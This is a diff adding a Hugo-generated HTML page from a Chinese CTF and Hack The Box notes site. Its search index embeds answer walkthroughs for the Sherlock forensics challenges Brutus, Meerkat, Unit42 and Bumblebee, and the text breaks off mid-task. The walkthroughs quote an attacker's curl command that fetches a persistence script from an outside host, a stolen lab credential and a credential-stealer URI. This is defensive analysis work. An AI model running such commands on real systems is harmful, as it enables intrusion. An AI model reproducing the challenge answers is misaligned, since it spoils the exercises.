@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+<html lang="zh-cn"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <title>HTB | 遥乡书屋</title>
+    <meta name="robots" content="noindex">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="Documentation, Hugo, Hugo Theme, Bootstrap" />
+    <meta name="author" content="Colin Wilson - Lotus Labs" />
+    <meta name="email" content="support@aigis.uk" />
+    <meta name="website" content="https://lotusdocs.dev" />
+    <meta name="Version" content="v0.1.0" />
+    
+    <link rel="icon" href="http://localhost:1313/favicon.ico" sizes="any">
+<link rel="icon" type="image/svg+xml" href="http://localhost:1313/favicon.svg">
+<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="manifest" crossorigin="use-credentials" href="http://localhost:1313/site.webmanifest">
+<meta property="og:title" content="HTB" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="http://localhost:1313/docs/htb/" /><meta property="og:image" content="http://localhost:1313/opengraph/card-base-2_hu_ba59b82d95993faf.png"/><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://localhost:1313/opengraph/card-base-2_hu_ba59b82d95993faf.png"/>
+<meta name="twitter:title" content="HTB"/>
+<meta name="twitter:description" content=""/>
+
+    
+        <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
+    
+    
+    
+            
+                <script type="text/javascript" src="http://localhost:1313/docs/js/flexsearch.bundle.js"></script>
+            
+        
+    
+    
+
+    <link rel="stylesheet" href="/docs/scss/style.css" crossorigin="anonymous">
+    
+    
+    </head>
+<body>
+        <div class="content">
+            <div class="page-wrapper toggled">
+<nav id="sidebar" class="sidebar-wrapper">
+    <div class="sidebar-brand">
+        <a href='/' aria-label="HomePage" alt="HomePage">
+            
+                <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+            
+        </a>
+    </div>
+    <div class="sidebar-content" style="height: calc(100% - 131px);">
+        <ul class="sidebar-menu">
+            
+                
+                
+                    
+                    
+                        <li class="sidebar-dropdown no-icon ">
+                            <button class="btn">
+                                CTF
+                            </button>
+                            <div class="sidebar-submenu ">
+                                <ul>
+                                    
+                                        
+                                        
+                                            <li class="sidebar-dropdown nested no-icon ">
+                                                <button class="btn">
+                                                    知识点
+                                                </button>
+                                                <div class="sidebar-submenu ">
+                                                    <ul>
+                                                        
+                                                            
+                                                            
+                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="http://localhost:1313/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/rce/">RCE</a></li>
+                                                            
+                                                        
+                                                            
+                                                            
+                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="http://localhost:1313/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Pickle反序列化</a></li>
+                                                            
+                                                        
+                                                            
+                                                            
+                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="http://localhost:1313/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/nodejs/">NodeJs</a></li>
+                                                            
+                                                        
+                                                    </ul>
+                                                </div>
+                                            </li>
+                                        
+                                    
+                                </ul>
+                            </div>
+                        </li>
+                    
+                
+                    
+                    
+                        <li class="sidebar-dropdown no-icon current active">
+                            <button class="btn">
+                                HTB
+                            </button>
+                            <div class="sidebar-submenu d-block">
+                                <ul>
+                                    
+                                        
+                                        
+                                            <li class="sidebar-dropdown nested no-icon ">
+                                                <button class="btn">
+                                                    Sherlock
+                                                </button>
+                                                <div class="sidebar-submenu ">
+                                                    <ul>
+                                                        
+                                                            
+                                                            
+                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="http://localhost:1313/docs/htb/sherlock/wp/">Wp</a></li>
+                                                            
+                                                        
+                                                    </ul>
+                                                </div>
+                                            </li>
+                                        
+                                    
+                                </ul>
+                            </div>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="http://localhost:1313/docs/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                
+                                春秋云镜
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="http://localhost:1313/docs/thm/">
+                                
+                                THM
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="http://localhost:1313/docs/%E5%85%B6%E4%BD%99%E9%9D%B6%E5%9C%BA/">
+                                
+                                其余靶场
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="http://localhost:1313/docs/%E5%85%B6%E4%BB%96/">
+                                
+                                其他
+                            </a>
+                        </li>
+                    
+                
+                    
+                        
+                        <li class="">
+                            <a class="sidebar-root-link" href="http://localhost:1313/docs/%E5%B7%A5%E5%85%B7%E7%AE%B1/">
+                                
+                                工具箱
+                            </a>
+                        </li>
+                    
+                
+            
+        </ul>
+        
+    </div>
+    
+        <ul class="sidebar-footer list-unstyled mb-0">
+            
+        </ul>
+    
+</nav>
+
+                    <main class="page-content bg-transparent">
+                        
+<div id="top-header" class="top-header d-print-none">
+    <div class="header-bar d-flex justify-content-between">
+        <div class="d-flex align-items-center">
+            <a href='/' class="logo-icon me-3" aria-label="HomePage" alt="HomePage">
+                <div class="small">
+                    
+                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+                    
+                </div>
+                <div class="big">
+                    
+                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
+                    
+                </div>
+            </a>
+            <button id="close-sidebar" class="btn btn-icon btn-soft">
+                <span class="material-icons size-20 menu-icon align-middle">menu</span>
+            </button>
+            
+            
+                    
+                    <button id="flexsearch-button" class="ms-3 btn btn-soft" data-bs-toggle="collapse" data-bs-target="#FlexSearchCollapse" aria-expanded="false" aria-controls="FlexSearchCollapse">
+                        <span class="material-icons size-20 menu-icon align-middle">search</span>
+                        <span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span>
+                        <div class="d-none d-sm-block">
+                            <span class="flexsearch-button-keys">
+                                <kbd class="flexsearch-button-cmd-key">
+                                    <svg width="44" height="15"><path d="M2.118,11.5A1.519,1.519,0,0,1,1,11.042,1.583,1.583,0,0,1,1,8.815a1.519,1.519,0,0,1,1.113-.458h.715V6.643H2.118A1.519,1.519,0,0,1,1,6.185,1.519,1.519,0,0,1,.547,5.071,1.519,1.519,0,0,1,1,3.958,1.519,1.519,0,0,1,2.118,3.5a1.519,1.519,0,0,1,1.114.458A1.519,1.519,0,0,1,3.69,5.071v.715H5.4V5.071A1.564,1.564,0,0,1,6.976,3.5,1.564,1.564,0,0,1,8.547,5.071,1.564,1.564,0,0,1,6.976,6.643H6.261V8.357h.715a1.575,1.575,0,0,1,1.113,2.685,1.583,1.583,0,0,1-2.227,0A1.519,1.519,0,0,1,5.4,9.929V9.214H3.69v.715a1.519,1.519,0,0,1-.458,1.113A1.519,1.519,0,0,1,2.118,11.5Zm0-.857a.714.714,0,0,0,.715-.714V9.214H2.118a.715.715,0,1,0,0,1.429Zm4.858,0a.715.715,0,1,0,0-1.429H6.261v.715a.714.714,0,0,0,.715.714ZM3.69,8.357H5.4V6.643H3.69ZM2.118,5.786h.715V5.071a.714.714,0,0,0-.715-.714.715.715,0,0,0-.5,1.22A.686.686,0,0,0,2.118,5.786Zm4.143,0h.715a.715.715,0,0,0,.5-1.22.715.715,0,0,0-1.22.5Z" fill="currentColor"></path><path d="M12.4,11.475H11.344l3.879-7.95h1.056Z" fill="currentColor"></path><path d="M25.073,5.384l-.864.576a2.121,2.121,0,0,0-1.786-.923,2.207,2.207,0,0,0-2.266,2.326,2.206,2.206,0,0,0,2.266,2.325,2.1,2.1,0,0,0,1.782-.918l.84.617a3.108,3.108,0,0,1-2.622,1.293,3.217,3.217,0,0,1-3.349-3.317,3.217,3.217,0,0,1,3.349-3.317A3.046,3.046,0,0,1,25.073,5.384Z" fill="currentColor"></path><path d="M30.993,5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172Z" fill="currentColor"></path><path d="M34.67,4.164c1.471,0,2.266.658,2.266,1.851,0,1.087-.832,1.809-2.134,1.855l2.107,2.691h-1.28L33.591,7.87H33.07v2.691H32.038v-6.4Zm-1.6.969v1.8h1.572c.832,0,1.22-.3,1.22-.918s-.411-.882-1.22-.882Z" fill="currentColor"></path><path d="M42.883,10.561H38.31v-6.4h1.033V9.583h3.54Z" fill="currentColor"></path></svg>
+                                </kbd>
+                                <kbd class="flexsearch-button-key">
+                                    <svg width="15" height="15"><path d="M5.926,12.279H4.41L9.073,2.721H10.59Z" fill="currentColor"/></svg>
+                                </kbd>
+                            </span>
+                        </div>
+                    </button>
+                
+            </div>
+
+        <div class="d-flex align-items-center">
+            <ul class="list-unstyled mb-0">
+                
+            </ul>
+            
+        </div>
+    </div>
+    
+    
+            <div class="collapse" id="FlexSearchCollapse">
+                <div class="flexsearch-container">
+                    <div class="flexsearch-keymap">
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to navigate</span>
+                        </li>
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to select</span>
+                        </li>
+                        <li>
+                            <kbd class="flexsearch-button-cmd-key"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd>
+                            <span class="flexsearch-key-label">to close</span>
+                        </li>
+                    </div>
+                    <form class="flexsearch position-relative flex-grow-1 ms-2 me-2">
+                        <div class="d-flex flex-row">
+                            <input id="flexsearch" class="form-control" type="search" placeholder="Search" aria-label="Search" autocomplete="off">
+                            <button id="hideFlexsearch" type="button" class="ms-2 btn btn-soft">
+                                cancel
+                            </button>
+                        </div>
+                        <div id="suggestions" class="shadow rounded-1 d-none"></div>
+                    </form>
+                </div>
+            </div>
+        
+    
+    
+</div>
+
+
+                            <div class="container-fluid">
+                                <div class="layout-spacing">
+                                    
+                                        <div class="d-md-flex justify-content-between align-items-center"><nav aria-label="breadcrumb" class="d-inline-block pb-2 mt-1 mt-sm-0">
+    <ul id="breadcrumbs" class="breadcrumb bg-transparent mb-0" itemscope itemtype="https://schema.org/BreadcrumbList">
+        
+            
+                <li class="breadcrumb-item text-capitalize active" aria-current="page" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/docs/">
+                        <i class="material-icons size-20 align-text-bottom" itemprop="name">Home</i>
+                    </a>
+                    <meta itemprop="position" content='1' />
+                </li>
+            
+        
+            <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                <span itemprop="name">HTB</span>
+                <meta itemprop="position" content='2' />
+            </li>
+        
+    </ul>
+</nav></div>
+                                    
+                                    <div class="row flex-xl-nowrap">
+                                        
+                                        <div class="docs-toc col-xl-3 visually-hidden visually-hidden  d-xl-block"><toc>
+    <div class="fw-bold text-uppercase mb-2">On this page</div>
+    <nav id="TableOfContents"></nav>
+    </toc></div>
+                                        
+                                        
+                                        <div class="docs-toc-mobile visually-hidden visually-hidden  d-print-none d-xl-none">
+                                            <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
+                                                Table of Contents
+                                            </button>
+<nav id="toc-mobile"></nav></div>
+                                        <div class="docs-content col-12  mt-0">
+                                            <div class="mb-0 d-flex">
+                                                
+                                                <h1 class="content-title mb-0">
+                                                    HTB
+                                                    
+                                                </h1>
+                                            </div>
+                                            
+                                            <div id="content" class="main-content" >
+                                                
+    <div class="row flex-xl-wrap">
+        
+        <div id="list-item" class="col-md-4 col-12 mt-4 pt-2">
+            <a class="text-decoration-none text-reset" href="http://localhost:1313/docs/htb/sherlock/">
+                <div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1">
+                    <span class="icon-color d-flex my-3">
+                        <i class="material-icons align-middle">article</i>
+                        
+                        <i class="material-icons icon-faint align-middle ms-auto" title="Directory">folder</i>
+                    </span>
+                    <div class="card-body p-0 content">
+                        <p class="fs-5 fw-semibold card-title mb-1">Sherlock</p>
+                        <p class="para card-text mb-0"></p>
+                    </div>
+                    
+                </div>
+            </a>
+        </div>
+        
+    </div>
+
+                                            </div>
+                                            <div><hr class="doc-hr">
+<div id="doc-nav" class="d-print-none">
+</div></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+<footer class="shadow py-3 d-print-none">
+    <div class="container-fluid">
+        <div class="row align-items-center">
+            <div class="col">
+                <div class="text-sm-start text-center mx-md-2">
+                    <p class="mb-0">
+                        
+                        
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</main>
+            </div>
+        </div>
+
+        
+        
+        <button onclick="topFunction()" id="back-to-top" aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12,10.224l-6.3,6.3L4.32,15.152,12,7.472l7.68,7.68L18.3,16.528Z" style="fill:#fff"/></svg></button>
+        
+        
+
+        
+        
+
+
+
+
+    
+    
+    
+
+
+
+
+
+
+    <script src="/docs/js/bootstrap.js" defer></script>
+
+
+    <script type="text/javascript" src="http://localhost:1313/docs/js/bundle.js" defer></script>
+
+        
+
+        
+        <script type="module">
+    var suggestions = document.getElementById('suggestions');
+    var search = document.getElementById('flexsearch');
+
+    const flexsearchContainer = document.getElementById('FlexSearchCollapse');
+
+    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');
+
+    const configObject = { toggle: false }
+    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 
+
+    if (search !== null) {
+        document.addEventListener('keydown', inputFocus);
+        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
+            search.focus();
+        });
+        
+        var topHeader = document.getElementById("top-header");
+        document.addEventListener('click', function(elem) {
+            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
+                flexsearchContainerCollapse.hide();
+        });
+    }
+
+    hideFlexsearchBtn.addEventListener('click', () =>{
+        flexsearchContainerCollapse.hide()
+    })
+
+    function inputFocus(e) {
+        if (e.ctrlKey && e.key === '/') {
+            e.preventDefault();
+            flexsearchContainerCollapse.toggle();
+        }
+        if (e.key === 'Escape' ) {
+            search.blur();
+            
+            flexsearchContainerCollapse.hide();
+        }
+    };
+
+    document.addEventListener('click', function(event) {
+
+    var isClickInsideElement = suggestions.contains(event.target);
+
+    if (!isClickInsideElement) {
+        suggestions.classList.add('d-none');
+    }
+
+    });
+
+    
+
+
+    document.addEventListener('keydown',suggestionFocus);
+
+    function suggestionFocus(e) {
+    const suggestionsHidden = suggestions.classList.contains('d-none');
+    if (suggestionsHidden) return;
+
+    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
+    if (focusableSuggestions.length === 0) return;
+
+    const index = focusableSuggestions.indexOf(document.activeElement);
+
+    if (e.key === "ArrowUp") {
+        e.preventDefault();
+        const nextIndex = index > 0 ? index - 1 : 0;
+        focusableSuggestions[nextIndex].focus();
+    }
+    else if (e.key === "ArrowDown") {
+        e.preventDefault();
+        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
+        focusableSuggestions[nextIndex].focus();
+    }
+
+    }
+
+    
+
+
+    (function(){
+
+    var index = new FlexSearch.Document({
+        
+        tokenize: "forward",
+        minlength:  0 ,
+        cache:  100 ,
+        optimize:  true ,
+        document: {
+        id: 'id',
+        store: [
+            "href", "title", "description"
+        ],
+        index: ["title", "description", "content"]
+        }
+    });
+
+
+    
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    
+
+    
+
+    index.add(
+            {
+                id:  0 ,
+                href: "\/docs\/ctf\/",
+                title: "CTF",
+                description: "1\n",
+                content: "1\n"
+            }
+        );
+    index.add(
+            {
+                id:  1 ,
+                href: "\/docs\/htb\/",
+                title: "HTB",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  2 ,
+                href: "\/docs\/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C\/",
+                title: "春秋云镜",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  3 ,
+                href: "\/docs\/thm\/",
+                title: "THM",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  4 ,
+                href: "\/docs\/%E5%85%B6%E4%BD%99%E9%9D%B6%E5%9C%BA\/",
+                title: "其余靶场",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  5 ,
+                href: "\/docs\/%E5%85%B6%E4%BB%96\/",
+                title: "其他",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  6 ,
+                href: "\/docs\/htb\/sherlock\/",
+                title: "Sherlock",
+                description: "",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  7 ,
+                href: "\/docs\/htb\/sherlock\/wp\/",
+                title: "Wp",
+                description: "解压密码为hacktheblue\nBrutus link 在这个非常简单的 Sherlock 任务中，您将熟悉 Unix 系统的 auth.log 和 wtmp 日志。我们将探讨一个 Confluence 服务器通过 SSH 服务遭受暴力破解的场景。攻击者获取服务器访问权限后，还进行了其他活动，这些都可以通过 auth.log 追踪。尽管 auth.log 主要用于暴力破解分析，但在本次调查中，我们将深入挖掘这一日志的全部潜力，包括权限提升、持久化攻击的迹象，甚至部分命令执行的可见性。\nTask1 link 分析 auth.log 日志。攻击者用于实施暴力破解攻击的 IP 地址是什么？ 65.2.161.68\nTask2 link 识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。 root\nTask3 link 识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。 2024-03-06 06:32:45\n分析wtmp文件即可\nTask4 link SSH 登录会话在登录时会被跟踪并分配一个会话编号。攻击者针对问题 2 中用户账户的会话被分配了哪个会话编号？ 37\nTask5 link 攻击者在服务器上添加了一个新用户作为其持久化策略的一部分，并赋予该新用户账户更高的权限。这个账户的名称是什么？ cyberjunkie\nTask6 link 用于通过创建新账户实现持久化的 MITRE ATT\u0026CK 子技术 ID 是什么？ T1136.001\n",
+                content: "解压密码为hacktheblue\nBrutus link 在这个非常简单的 Sherlock 任务中，您将熟悉 Unix 系统的 auth.log 和 wtmp 日志。我们将探讨一个 Confluence 服务器通过 SSH 服务遭受暴力破解的场景。攻击者获取服务器访问权限后，还进行了其他活动，这些都可以通过 auth.log 追踪。尽管 auth.log 主要用于暴力破解分析，但在本次调查中，我们将深入挖掘这一日志的全部潜力，包括权限提升、持久化攻击的迹象，甚至部分命令执行的可见性。\nTask1 link 分析 auth.log 日志。攻击者用于实施暴力破解攻击的 IP 地址是什么？ 65.2.161.68\nTask2 link 识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。 root\nTask3 link 识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。 2024-03-06 06:32:45\n分析wtmp文件即可\nTask4 link SSH 登录会话在登录时会被跟踪并分配一个会话编号。攻击者针对问题 2 中用户账户的会话被分配了哪个会话编号？ 37\nTask5 link 攻击者在服务器上添加了一个新用户作为其持久化策略的一部分，并赋予该新用户账户更高的权限。这个账户的名称是什么？ cyberjunkie\nTask6 link 用于通过创建新账户实现持久化的 MITRE ATT\u0026CK 子技术 ID 是什么？ T1136.001\n技术为创建用户-本地用户 https://attack.mitre.org/techniques/T1136/\nTask7 link 根据 auth.log，攻击者的第一次 SSH 会话何时结束？ 2024-03-06 06:37:24\nTask8 link 攻击者登录其后门账户并利用其更高权限下载了一个脚本。使用 sudo 执行的具体完整命令是什么？ /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh\nMeerkat link 作为一家快速发展的初创公司，Forela 一直在使用业务管理平台。遗憾的是，我们的文档匮乏，且管理员的安全意识较为薄弱。作为新任安全服务提供商，我们希望您能查看我们导出的部分 PCAP 和日志数据，以确认我们是否遭受（或未遭受）入侵。\nTask1 link 我们怀疑业务管理平台服务器可能已遭入侵。请确认当前运行的应用程序名称？ Bonitasoft\nwireshark-统计-端点-TCP-按照流量包大小排序\n能看见一个外部地址发包最多，其次是内网地址的三个端口，猜测第一个为攻击者ip，8080为服务端口，过滤此端口\nip.dst==172.31.6.44 \u0026\u0026 tcp.port==8080 找到访问记录；\n搜索得知软件名称\nTask2 link 我们相信攻击者可能使用了暴力破解攻击类别的一个子集——所进行的攻击名称是什么？ Credential Stuffing\n按照info和time排序，找到爆破行为：\n查看\n不像是暴力，更像是撞库\nTask3 link 被利用的漏洞是否分配有 CVE 编号？如果有，是哪一个？ CVE-2022-25237\n能看见访问了这个路由\n搜索得到编号，CVE-2022-25237\nTask4 link 攻击者的漏洞利用在 API URL 路径后附加了哪个字符串以绕过授权过滤器？ i18ntranslation\n参见上一问即可\nTask5 link 在凭证填充攻击中使用了多少组用户名和密码的组合？ 56\n文件-导出分组解析结果为纯文本，用脚本提取即可\nimport re def extract_usernames(filename): pattern = r'Form item: \"username\"\\s*=\\s*\"([^\"]+)\"' usernames = [] with open(filename, 'r', encoding='utf-8') as file: for line in file: match = re.search(pattern, line) if match: usernames.append(match.group(1)) return usernames # 使用示例 usernames = extract_usernames('1.txt') usernames = set(usernames) print(len(usernames)) for i in usernames: print(i) 得到结果57，但是不对，去掉默认账户install:install就对了\nTask6 link 哪一组用户名和密码组合成功了？ seb.broom@forela.co.uk:g0vernm3nt\n过滤响应码200的包\nip.addr == 172.31.6.44 \u0026\u0026 tcp.port == 8080 \u0026\u0026 http.response.code == 200 Task7 link 如果有的话，攻击者利用了哪个文本分享网站？ pastes.io\nTask8 link 请提供攻击者用于在我们主机上维持持久访问的公钥文件名。 hffgra4unv\n题目翻译的有点问题，意思应该是用哪个文件写入的公钥 打开上一题找到的url能看见\nTask9 link 你能确认攻击者为维持持久访问所修改的文件吗？ /home/ubuntu/.ssh/authorized_keys\n见上一题\nTask10 link 您能确认这种持久化机制对应的 MITRE 技术 ID 吗？ T1098.004\nUnit42 link附件是一个evtx文件，windows事件查看器能直接打开 附上sysmon事件id表\nTask1 link 事件 ID 为 11 的日志记录共有多少条？ 56\n筛选就能知道\nTask2 link 每当在内存中创建一个进程时，都会记录一个事件 ID 为 1 的事件，其中包含命令行、哈希值、进程路径、父进程路径等详细信息。这些信息对分析师非常有用，因为它允许我们查看系统上执行的所有程序，这意味着我们可以发现任何正在执行的恶意进程。受害者系统感染的恶意进程是什么？ C:\\Users\\CyberJunkie\\Downloads\\Preventivo24.02.14.exe.exe\n过滤id位1的事件，第二个的程序不正常\nTask3 link 哪种云盘被用来分发恶意软件？ dropbox\n查表，22是dns查询，翻id为22的事件，找到一个特殊域名\n确认是云盘\nTask4 link 对于许多写入磁盘的文件，初始恶意文件采用了一种名为“时间戳伪造”的防御规避技术，即更改文件创建日期使其显得更旧，从而与其他文件混为一体。PDF 文件的时间戳被修改为何时？ 2024-01-14 08:10:06.029\n过滤事件id=2，搜索pdf\n日志是2-14号的，做旧就是1-14了\nTask5 link 恶意文件在磁盘上释放了几个文件。“once.cmd\"是在磁盘的哪个位置创建的？请提供包含文件名的完整路径作为答案。\n过滤事件id=11，搜索once.cmd\nTask6 link 该恶意文件尝试连接一个虚拟域名，很可能是为了检测网络连接状态。它试图连接的域名是什么？ www.example.com\n域名和dns有关，过滤事件22\nTask7 link 恶意进程试图连接的 IP 地址是哪个？ 93.184.216.34\n过滤事件3\nTask8 link 恶意进程在感染 PC 后自行终止，该 PC 被植入了 UltraVNC 的后门变种。该进程是何时自行终止的？ 2024-02-14 03:41:58\n过滤进程5\nBumblebee link 一名外部承包商通过访客 Wi-Fi 访问了 Forela 的内部论坛，并且似乎窃取了管理员用户的凭证！我们附上了一些论坛日志和完整的 sqlite3 格式数据库转储文件，以协助您的调查。\nTask1 link 该外部承包商的用户名是什么？ apoole\n提示结尾有个1，在数据库50多项有俩，试了一下第二个是\nTask2 link 承包商使用哪个 IP 地址创建了他们的账户？ 10.10.0.78\nTask3 link 承包商发布的恶意帖子的 post_id 是什么？ 9\nphpbb_posts数据库里找\nTask4 link 凭证窃取程序发送数据的完整 URI 是什么 http://10.10.0.78/update.php\n上一题的posts内容复制本地html打开，login标签找到\nTask5 link 承包商何时以管理员身份登录论坛？（UTC 时间 